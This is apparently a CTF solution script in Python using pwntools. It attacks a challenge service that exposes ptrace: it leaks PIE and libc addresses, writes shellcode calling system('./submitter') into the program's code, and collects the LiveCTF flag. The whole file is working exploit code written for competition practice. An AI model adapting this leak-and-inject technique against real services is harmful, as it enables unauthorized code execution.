#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"
context.log_level = "debug"
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
#io = process("./challenge")

libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def ptrace(req, addr, data, another=True):
    io.sendlineafter(b"send?\n", hex(req).encode()) 
    io.sendlineafter(b"want?\n", hex(addr).encode()) 
    io.sendlineafter(b"data?\n", hex(data).encode()) 
    io.recvuntil(b"returned ")
    val = int(io.recvline().decode().strip(), 16)
    io.sendlineafter(b"(0/1)?", str(int(another)).encode())
    return val

a = ptrace(3, 8, 0)
pie = a - 0x3d68
print("pie:", hex(pie))
puts_got = pie + 0x0003f80
puts_addr = ptrace(1, puts_got, 0)
print("puts:", hex(puts_addr))
print(hex(libc.sym["_IO_puts"]))
libc_base = puts_addr - libc.sym["_IO_puts"]
print("libc:", hex(libc_base))
system = libc_base + libc.sym["system"]

code_addr = pie + 0x013B8
code = asm(f"mov rdi,{code_addr+22}\nmov rax,{system}\ncall rax") + b"./submitter\x00"
for i in range(0, len(code), 8):
    ptrace(4, code_addr+i, int.from_bytes(code[i:i+8], "little"))
ptrace(7, 0, 0, False)

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info(flag)

